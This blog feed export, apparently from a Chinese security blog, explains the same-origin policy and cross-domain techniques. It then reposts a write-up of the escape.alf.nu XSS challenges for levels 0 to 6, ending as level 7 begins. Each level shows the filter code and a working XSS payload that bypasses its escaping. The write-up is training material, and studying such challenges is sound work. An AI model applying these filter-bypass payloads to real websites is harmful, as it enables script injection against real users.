<p>简单的说就是限制了一个源（origin）中加载文本或脚本与来自其它源（origin）中资源的交互方式。</p>
<p>判定依据 : 如果两个页面拥有相同的协议（protocol），端口（如果指定），和主机，那么这两个页面就属于同一个源（origin）。</p>
<p><img src="http://evilddog.qiniudn.com/2014-10-13%2018%3A16%3A53%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""></p>
<p>如下两个网页：</p>
<pre><code>http:<span class="comment">//www.example.com/sam.html</span>
https:<span class="comment">//www.example.com/chen.html</span>
</code></pre><p>它们的协议不一，一个是 http，一个是 https，所以不同源。同理可推端口、主机。</p>
<h1 id="0x02_解决方法">0x02  解决方法</h1>
<h2 id="主域相同而子域不同">主域相同而子域不同</h2>
<p><strong>对于主域相同而子域不同的例子，可以通过设置document.domain的办法来解决。</strong></p>
<p>因为javascript允许子域之间使用顶级域名。</p>
<p>具体的做法是可以在<a href="http://www.a.com/a.html和http://script.a.com/b.html两个文件中分别加上document.domain" target="_blank" rel="external">http://www.a.com/a.html和http://script.a.com/b.html两个文件中分别加上document.domain</a> = ‘a.com’</p>
<p>某一页面的domain默认等于window.location.hostname。主域名是不带www的域名，例如a.com，主域名前面带前缀的通常都为二级域名或多级域名</p>
<p>例如www.a.com其实是二级域名。 domain只能设置为主域名，不可以在b.a.com中将domain设置为c.a.com。</p>
<p>然后通过a.html文件中创建一个iframe，去控制iframe的contentDocument，这样两个js文件之间就可以“交互”了。</p>
<p>但是依然要注意设置这个属性之后，子域之间可以方便的通信，需注意的是协议和端口号必须相同。</p>
<ul>
<li>www.a.com上的a.html</li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">document</span>.domain = <span class="string">'a.com'</span>;</div><div class="line"><span class="keyword">var</span> ifr = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</div><div class="line">ifr.src = <span class="string">'http://script.a.com/b.html'</span>;</div><div class="line">ifr.style.display = <span class="string">'none'</span>;</div><div class="line"><span class="built_in">document</span>.body.appendChild(ifr);</div><div class="line">ifr.onload = <span class="function"><span class="keyword">function</span><span class="params">()</span></span>{</div><div class="line">truevar doc = ifr.contentDocument || ifr.contentWindow.document;</div><div class="line"><span class="literal">true</span><span class="comment">// 在这里操纵b.html</span></div><div class="line">truealert(doc.getElementsByTagName(<span class="string">"h1"</span>)[<span class="number">0</span>].childNodes[<span class="number">0</span>].nodeValue);</div><div class="line">};</div></pre></td></tr></table></figure>

<ul>
<li>script.a.com上的b.html</li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">document</span>.domain = <span class="string">'a.com'</span>;</div></pre></td></tr></table></figure>

<p>当然如果二级域名相同的情况下,如果其中一个被攻击了,那么另外一个就危险了  : )</p>
<h2 id="对于主域不相同的跨域的情况">对于主域不相同的跨域的情况</h2>
<p><br></p>
<hr>

<h3 id="1-使用HTML5_postMessage——HTML方法">1.使用HTML5 postMessage——<em>HTML方法</em></h3>
<p><hr><br><strong><a href="https://developer.mozilla.org/en/dom/window.postmessage" target="_blank" rel="external">postMessage()</a>是HTML5的一个新功能，由于比较新，所以在IE6和IE7中不支持。</strong></p>
<p>不同域的跨域方法就是利用postMessage():</p>
<p>函数解释:<br>    otherWindow.postMessage(message, targetOrigin);</p>
<ul>
<li>otherWindow: 对接收信息页面的window的引用。可以是页面中iframe的contentWindow属性；window.open的返回值；通过name或下标从window.frames取到的值。</li>
<li>message: 所要发送的数据，string类型。</li>
<li>targetOrigin: 用于限制otherWindow，“*”表示不作限制</li>
</ul>
<p>a.com中的代码 :</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">iframe</span> <span class="attribute">id</span>=<span class="value">"ifr"</span> <span class="attribute">src</span>=<span class="value">"b.com/index.html"</span>&gt;</span><span class="tag">&lt;/<span class="title">iframe</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span>&gt;</span><span class="javascript"></span></div><div class="line">truewindow.onload = <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>{</div><div class="line">truetruevar ifr = <span class="built_in">document</span>.getElementById(<span class="string">'ifr'</span>);</div><div class="line">truetruevar targetOrigin = <span class="string">'http://b.com'</span>;</div><div class="line">truetrue<span class="comment">// 若写成'http://b.com/c/proxy.html'效果一样</span></div><div class="line">truetrue<span class="comment">// 若写成'http://c.com'就不会执行postMessage了</span></div><div class="line">truetrueifr.contentWindow.postMessage(<span class="string">'I was there!'</span>, targetOrigin);</div><div class="line"><span class="literal">true</span>};</div><div class="line"><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div></pre></td></tr></table></figure>

<p>b.com/index.html中的代码：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;script type=<span class="string">"text/javascript&gt;</span></div><div class="line">truewindow.addEventListener('message', function(event){</div><div class="line">truetrue<span class="comment">// 通过origin属性判断消息来源地址</span></div><div class="line">truetrueif (event.origin == 'http:<span class="comment">//a.com') {</span></div><div class="line">truetruetruealert(event.data); <span class="comment">// 弹出"I was there!"</span></div><div class="line">truetruetruealert(event.source); <span class="comment">// 对a.com、index.html中window对象的引用</span></div><div class="line">truetruetrue<span class="comment">// 但由于同源策略，这里event.source不可以访问window对象  </span></div><div class="line">truetrue}</div><div class="line">true}, false);</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>

<p><br></p>
<hr>

<h3 id="2-DOM创建script——Javasript方法">2.DOM创建script——<em>Javasript方法</em></h3>
<p><hr><br><strong>浏览器默认禁止了跨域访问，但并不禁止在页面中引用其他域的JS文件，并可以自由执行引入的JS文件中的function（包括操作cookie、Dom等等）</strong><br>根据这一点，可以方便地通过创建script节点的方法来实现完全跨域的通信。    </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">	js.onload = js.onreadystatechange = <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>{</div><div class="line">truetrueif (!<span class="keyword">this</span>.readyState || <span class="keyword">this</span>.readyState === <span class="string">'loaded'</span> || <span class="keyword">this</span>.readyState === <span class="string">'complete'</span>) {</div><div class="line">truetruetrue<span class="comment">// callback在此处执行</span></div><div class="line">truetruetruejs.onload = js.onreadystatechange = <span class="literal">null</span>;</div><div class="line">}</div><div class="line"><span class="literal">true</span>};</div></pre></td></tr></table></figure>

<p><br></p>
<hr>

<h3 id="3-利用iframe和location-hash——Javascipt方法">3.利用iframe和location.hash——<em>Javascipt方法</em></h3>
<p><hr><br><strong>location是javascript里边管理地址栏的内置对象，比如location.href就管理页面的url，用location.href=url就可以直接将页面重定向url。而location.hash则可以用来获取或设置页面的标签值。比如<a href="http://a.com/#aaaaa" target="_blank" rel="external">http://a.com/#aaaaa</a> 的location.hash=”#aaaaa”</strong></p>
<p>这个方法虽然比较麻烦，但是可以解决跨域的脚步置换问题，因为变hash并不会导致页面刷新，所以可以利用hash值来进行数据传递，当然数据容量是有限的。</p>
<p>域名a.com下的文件cs1.html要和cnblogs.com域名下的cs2.html传递信息。</p>
<p>cs1.html首先创建自动创建一个隐藏的iframe，iframe的src指向cnblogs.com域名下的cs2.html页面，这时的hash值可以做参数传递用。</p>
<p>cs2.html响应请求后再将通过修改cs1.html的hash值来传递数据（由于两个页面不在同一个域下<strong>IE、Chrome不允许修改parent.location.hash的值</strong>，所以要借助于a.com域名下的一个代理iframe；<strong>Firefox可以修改</strong>）。</p>
<p>同时在cs1.html上加一个定时器，隔一段时间来判断location.hash的值有没有变化，一点有变化则获取获取hash值。</p>
<p>a.com 下的cs1.html文件</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">startRequest</span><span class="params">()</span></span>{</div><div class="line">truevar ifr = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</div><div class="line">trueifr.style.display = <span class="string">'none'</span>;</div><div class="line">trueifr.src = <span class="string">'http://www.cnblogs.com/lab/cscript/cs2.html#paramdo'</span>;</div><div class="line">truedocument.body.appendChild(ifr);</div><div class="line">}</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkHash</span><span class="params">()</span> </span>{</div><div class="line">truetry {</div><div class="line">truetruevar data = location.hash ? location.hash.substring(<span class="number">1</span>) : <span class="string">''</span>;</div><div class="line">truetrueif (<span class="built_in">console</span>.log) {</div><div class="line">truetruetrueconsole.log(<span class="string">'Now the data is '</span>+data);</div><div class="line">truetrue}</div><div class="line"><span class="literal">true</span>} <span class="keyword">catch</span>(e) {};</div><div class="line">}</div><div class="line">setInterval(checkHash, <span class="number">2000</span>);</div><div class="line">cnblogs.com域名下的cs2.html:</div><div class="line"><span class="comment">//模拟一个简单的参数处理操作</span></div><div class="line"><span class="keyword">switch</span>(location.hash){</div><div class="line">truecase <span class="string">'#paramdo'</span>:</div><div class="line">truecallBack();</div><div class="line">truebreak;</div><div class="line">truecase <span class="string">'#paramset'</span>:</div><div class="line"><span class="literal">true</span><span class="comment">//do something……</span></div><div class="line">truebreak;</div><div class="line">}</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">callBack</span><span class="params">()</span></span>{</div><div class="line">truetry {</div><div class="line">trueparent.location.hash = <span class="string">'somedata'</span>;</div><div class="line"><span class="literal">true</span>} <span class="keyword">catch</span> (e) {</div><div class="line">truetrue<span class="comment">// ie、chrome的安全机制无法修改parent.location.hash，</span></div><div class="line">truetrue<span class="comment">// 所以要利用一个中间的cnblogs域下的代理iframe</span></div><div class="line">truetruevar ifrproxy = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</div><div class="line">truetrueifrproxy.style.display = <span class="string">'none'</span>;</div><div class="line">truetrueifrproxy.src = <span class="string">'http://a.com/test/cscript/cs3.html#somedata'</span>; <span class="comment">// 注意该文件在"a.com"域下</span></div><div class="line">truetruedocument.body.appendChild(ifrproxy);</div><div class="line"><span class="literal">true</span>}</div><div class="line">}</div></pre></td></tr></table></figure>

<p>a.com下的域名cs3.html</p>
<pre><code><span class="comment">//因为parent.parent和自身属于同一个域，所以可以改变其location.hash的值</span>
<span class="keyword">parent</span>.<span class="keyword">parent</span>.location.hash = <span class="keyword">self</span>.location.hash.substring(<span class="number">1</span>);
</code></pre><p><br></p>
<hr>

<h3 id="4-利用windows-name实现跨域数据传输——Javascript方法">4.利用windows.name实现跨域数据传输——<em>Javascript方法</em></h3>
<p><hr><br><strong>该方法是利用iframe的src属性由外域转向本地域，跨域数据即由iframe的window.name从外域传递到本地域。这个就巧妙地绕过了浏览器的跨域访问限制，但同时它又是安全操作</strong></p>
<p>有三个页面：</p>
<ul>
<li>a.com/app.html：应用页面。</li>
<li>a.com/proxy.html：代理文件，一般是一个没有任何内容的html文件，需要和应用页面在同一域下。</li>
<li>b.com/data.html：应用页面需要获取数据的页面，可称为数据页面。</li>
</ul>
<p>基本操作：</p>
<ul>
<li>0x01. 在应用页面（a.com/app.html）中创建一个iframe，把其src指向数据页面（b.com/data.html）。<br>数据页面会把数据附加到这个iframe的window.name上，data.html代码如下： </li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span>&gt;</span><span class="javascript"></span></div><div class="line">truewindow.name = <span class="string">'I was there!'</span>;    <span class="comment">// 这里是要传输的数据，大小一般为2M，IE和firefox下可以大至32M左右</span></div><div class="line"><span class="literal">true</span><span class="comment">// 数据格式可以自定义，如json、字符串</span></div><div class="line"><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div></pre></td></tr></table></figure>

<ul>
<li>0x02. 在应用页面（a.com/app.html）中监听iframe的onload事件，在此事件中设置这个iframe的src指向本地域的代理文件（代理文件和应用页面在同一域下，所以可以相互通信）。app.html部分代码如下： </li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span>&gt;</span><span class="javascript"></span></div><div class="line">truevar state = <span class="number">0</span>, </div><div class="line">trueiframe = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>),</div><div class="line">trueloadfn = <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>{</div><div class="line">truetrueif (state === <span class="number">1</span>) {</div><div class="line">truetruetruevar data = iframe.contentWindow.name;    <span class="comment">// 读取数据</span></div><div class="line">truetruetruealert(data);    <span class="comment">//弹出'I was there!'</span></div><div class="line">truetrue} <span class="keyword">else</span> <span class="keyword">if</span> (state === <span class="number">0</span>) {</div><div class="line">truetruetruestate = <span class="number">1</span>;</div><div class="line">truetruetrueiframe.contentWindow.location = <span class="string">"http://a.com/proxy.html"</span>;   </div><div class="line">truetrue 	<span class="comment">// 设置的代理文件</span></div><div class="line">truetrue}  </div><div class="line"><span class="literal">true</span>};</div><div class="line">trueiframe.src = <span class="string">'http://b.com/data.html'</span>;</div><div class="line">trueif (iframe.attachEvent) {</div><div class="line">truetrueiframe.attachEvent(<span class="string">'onload'</span>, loadfn);</div><div class="line"><span class="literal">true</span>} <span class="keyword">else</span> {</div><div class="line">truetrueiframe.onload  = loadfn;</div><div class="line"><span class="literal">true</span>}</div><div class="line">truedocument.body.appendChild(iframe);</div><div class="line"><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div></pre></td></tr></table></figure>

<ul>
<li>0x03.获取数据以后销毁这个iframe，释放内存；这也保证了安全（不被其他域frame js访问）。</li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span>&gt;</span><span class="javascript"></span></div><div class="line">trueiframe.contentWindow.document.write(<span class="string">''</span>);</div><div class="line">trueiframe.contentWindow.close();</div><div class="line">truedocument.body.removeChild(iframe);</div><div class="line"><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div></pre></td></tr></table></figure>

<p><br></p>
<hr>

<h3 id="5-同步XMLHttpRequest请求——XML方法">5.同步XMLHttpRequest请求——<strong>XML方法</strong></h3>
<p><hr><br>简单的同步XMLHttpRequest请求：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> x = <span class="keyword">new</span> XMLHttpRequest();</div><div class="line">x.open(<span class="string">"POST"</span>, <span class="string">"/some_script.cgi"</span>, <span class="literal">false</span>);</div><div class="line">x.setRequestHeader(<span class="string">"X-Random-Header"</span>, <span class="string">"Hi mom!"</span>);</div><div class="line">x.send(<span class="string">"...POST payload here..."</span>);</div><div class="line">alert(x.responseText);</div></pre></td></tr></table></figure>

]]></content>
    <summary type="html">
    <![CDATA[<hr>

<h1 id="0x01_概念">0x01  概念</h1>
<p>同源策略(Same Origin Policy，SOP)，由Netscape提出的一个著名的安全策略,也称为单源策略(Single Origin policy).</p>
]]>
    
    </summary>
    
      <category term="同源策略" scheme="http://evilddog.github.io//tags/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"/>
    
      <category term="浏览器安全" scheme="http://evilddog.github.io//categories/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[escape-Write-ups (Part 1)]]></title>
    <link href="http://evilddog.github.io/2014/10/12/escape-alf-nu-write-ups-1/"/>
    <id>http://evilddog.github.io/2014/10/12/escape-alf-nu-write-ups-1/</id>
    <published>2014-10-12T06:00:48.000Z</published>
    <updated>2014-11-05T16:18:46.000Z</updated>
    <content type="html"><![CDATA[<hr>

<h2 id="前言">前言</h2>
<p>这是国外的XSS游戏<a href="http://escape.alf.nu" target="_blank" rel="external">escape.alf.nu</a>,国内也有类似的比如    <a href="http://prompt.ml" target="_blank" rel="external">prompt.ml</a>    </p>
<a id="more"></a>

<p>花了好久好久才找到的Write-ups,因为是一年前的游戏,没找到中文的翻译</p>
<p>于是直接贴在这里了,原链接为<a href="http://www.pwntester.com/blog/2014/01/06/escape-alf-nu-xss-challenges-write-ups-part-148/" target="_blank" rel="external">点我</a></p>
<p>因为原文是分为Part1和Part2,我懒得合并,就按照原样分开贴了</p>
<p>请移步<a href="http://evilddog.github.io/2014/10/12/escape-alf-nu-write-ups-2/" target="_blank" rel="external">Part2</a></p>
<p>版权所有,侵删请联系root.evilddog#gmail.com</p>
<h2 id="原文">原文</h2>
<p>   These are my solutions to    Erling Ellingsen    escape.alf.nu XSS challenges    . I found them very interesting and I learnt a lot from them (especially from the last ones to be published in Part 2). Im publishing my results since the game has been online for a long time now and there are already some sites with partial results.  </p>
<p>My suggestion, if you havent done it so far, is to go and try to solve them by yourselves…. so come on, dont be lazy, stop reading here and give them a try …</p>
<p>…</p>
<p>…</p>
<p>…</p>
<p>…</p>
<p>Ok so if you have already solve them or need some hits, here are my solutions</p>
<h3 id="Level_0:">Level 0:</h3>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(s)</span> {</span></div><div class="line">	<span class="comment">// Warmup.  </span></div><div class="line">	<span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("</span><span class="string">'+s+'</span><span class="string">");&lt;/script&gt;'</span>;</div><div class="line">}</div></pre></td></tr></table></figure>

<p>There is no encoding so the easiest solution is to close “log” call and inject our “alert”</p>
<p>Solution:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">");alert(1,"</span></div></pre></td></tr></table></figure>

<h3 id="Level_1:">Level 1:</h3>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(s)</span> {</span></div><div class="line">	<span class="comment">// Escaping scheme courtesy of Adobe Systems, Inc.  </span></div><div class="line">	s = <span class="transposed_variable">s.</span>replace(/<span class="string">"/g, '</span>\\<span class="string">"'</span>);  </div><div class="line">	<span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("</span><span class="string">' + s + '</span><span class="string">");&lt;/script&gt;'</span>;</div><div class="line">}</div></pre></td></tr></table></figure>

<p>Function is escaping double quotes by adding two slashes. Shortest solution is to inject    \“    so the escape function turns it into</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="command">\\</span><span class="command">\"</span></div></pre></td></tr></table></figure>

<p>Effectively escaping the backslash but not the double quotes.</p>
<p>Solution:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">\");<span class="function">alert</span>(1)<span class="comment">//</span></div></pre></td></tr></table></figure>

<h3 id="Level_2:">Level 2:</h3>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(s)</span> </span>{  </div><div class="line">	s = <span class="built_in">JSON</span>.stringify(s);  </div><div class="line">	<span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log('</span> + s + <span class="string">');&lt;/script&gt;'</span>;</div><div class="line">}</div></pre></td></tr></table></figure>

<p>JSON.stringify() will escape double quotes (“) into (\”) but it does not escaps angle brackets (&lt;&gt;), so we can close the current script block and start a brand new one.</p>
<p>Solution:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;/<span class="title">script</span>&gt;</span><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">alert(<span class="number">1</span>)<span class="comment">//</span></span></div></pre></td></tr></table></figure>

<h3 id="Level_3:">Level 3:</h3>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(s)</span> </span>{  </div><div class="line">	<span class="keyword">var</span> url = <span class="string">'javascript:console.log('</span> + <span class="built_in">JSON</span>.stringify(s) + <span class="string">')'</span>;</div><div class="line">	<span class="built_in">console</span>.log(url);  </div><div class="line">	</div><div class="line">	<span class="keyword">var</span> a = <span class="built_in">document</span>.createElement(<span class="string">'a'</span>);  </div><div class="line">	a.href = url;  </div><div class="line">	<span class="built_in">document</span>.body.appendChild(a);  </div><div class="line">	a.click();</div><div class="line">}</div></pre></td></tr></table></figure>

<p>Again (“) is escaped but since we are within a URL context we can use URL encoding. In this case %22 for (”)</p>
<p>Solution:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">%<span class="title">22</span></span>);alert(1)//</div></pre></td></tr></table></figure>

<h3 id="Level_4:">Level 4:</h3>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(s)</span> </span>{  </div><div class="line">	<span class="keyword">var</span> text = s.replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&lt;'</span>).replace(<span class="string">'"'</span>, <span class="string">'&quot;'</span>);  </div><div class="line">	<span class="comment">// URLs  </span></div><div class="line">	text = text.replace(<span class="regexp">/(http:\/\/\S+)/g</span>, <span class="string">'&lt;a href="$1"&gt;$1&lt;/a&gt;'</span>);  </div><div class="line">	<span class="comment">// [[img123|Description]]  </span></div><div class="line">	text = text.replace(<span class="regexp">/\[\[(\w+)\|(.+?)\]\]/g</span>, <span class="string">'&lt;img alt="$2" src="$1.gif"&gt;'</span>);  </div><div class="line">	<span class="keyword">return</span> text;</div><div class="line">}</div></pre></td></tr></table></figure>

<p>The following characters are replaced:</p>
<ul>
<li><p>&lt; → &lt; (all ocurrences)</p>
</li>
<li><p>“ → &quot; (just the first occurrence)</p>
</li>
</ul>
<p>The escape function also use a template like [[src|alt]] that becomes、</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img <span class="variable">alt=</span><span class="string">"alt"</span> <span class="variable">src=</span><span class="string">"src.gif"</span>&gt;</div></pre></td></tr></table></figure>

<p>We can use this template with any    src    and an    alt    starting with a double quote (“) that will be escaped, a second double quote (”) that won’t be escaped and then a new event handler like    onload=“alert(1)    that will be closed by the double quote inserted by the template.</p>
<p>Solution:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">[[a|""onload="alert(1)]]</span></div></pre></td></tr></table></figure>

<p>It will be rendered as:<br><img src="http://evilddog.qiniudn.com/escape.alf.nu_1.png" alt=""></p>
<h3 id="Level_5:">Level 5:</h3>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(s)</span> </span>{</div><div class="line">  		<span class="comment">// Level 4 had a typo, thanks Alok.</span></div><div class="line">	<span class="comment">// If your solution for 4 still works here, you can go back and get more points on level 4 now.</span></div><div class="line">	<span class="keyword">var</span> text = s.replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&lt;'</span>).replace(<span class="regexp">/"/g</span>, <span class="string">'&quot;'</span>);</div><div class="line">   	<span class="comment">// URLs</span></div><div class="line">   	text = text.replace(<span class="regexp">/(http:\/\/\S+)/g</span>, <span class="string">'&lt;a href="$1"&gt;$1&lt;/a&gt;'</span>);</div><div class="line">   	<span class="comment">// [[img123|Description]]</span></div><div class="line">   	text = text.replace(<span class="regexp">/\[\[(\w+)\|(.+?)\]\]/g</span>, <span class="string">'&lt;img alt="$2" src="$1.gif"&gt;'</span>);</div><div class="line">   	<span class="keyword">return</span> text;</div><div class="line">}</div></pre></td></tr></table></figure>

<p>Now we cannot rely on the (    “    ) regexp typo but we can still use the template function to generate an image tag executing our    alert(1)    when loaded. We will use any    src    and a URL that will be replaced by the second replace function.</p>
<p>Solution:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">[[a|http://onload='alert(1)']]</span></div></pre></td></tr></table></figure>

<p>The first replace function wont trigger with this payload</p>
<p>The second replace function will act on the URL getting:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">[[a|&lt;a href="http://onload='alert(1)']]</span><span class="string">"&gt;http://onload='alert(1)']]&lt;/a&gt;</span></div></pre></td></tr></table></figure>

<p>The third replace function will create our      img      tag</p>
<p>It will be rendered as:<br><img src="http://evilddog.qiniudn.com/escape.alf.nu_2.png" alt=""></p>
<h3 id="Level_6:">Level 6:</h3>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(s)</span> </span>{  </div><div class="line">	<span class="comment">// Slightly too lazy to make two input fields.  </span></div><div class="line">	<span class="comment">// Pass in something like "TextNode#foo"  </span></div><div class="line">	<span class="keyword">var</span> m = s.split(<span class="regexp">/#/</span>);  </div><div class="line">	<span class="comment">// Only slightly contrived at this point.  </span></div><div class="line">	<span class="keyword">var</span> a = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>);  </div><div class="line">	a.appendChild(<span class="built_in">document</span>[<span class="string">'create'</span>+m[<span class="number">0</span>]].apply(<span class="built_in">document</span>, m.slice(<span class="number">1</span>)));  </div><div class="line">	<span class="keyword">return</span> a.innerHTML;</div><div class="line">}</div></pre></td></tr></table></figure>

<p>The trick is to review all the functions in the DOM that begin with “create” and that dont escape characters. The shortest one is to use “createComment”. For example    Comment#<foo>    will create the following code:</foo></p>
<pre><code><span class="comment">&lt;!--&lt;foo&gt;--&gt;</span>
</code></pre><p>From there, its easy to go to:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Comment<span class="comment">#&gt;&lt;svg onload=alert(1)</span></div></pre></td></tr></table></figure>

<p>That will render:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!--&gt;&lt;svg onload=alert(1)--&gt;</span></div></pre></td></tr></table></figure>

<h3 id="Level_7:">Level 7:</h3>
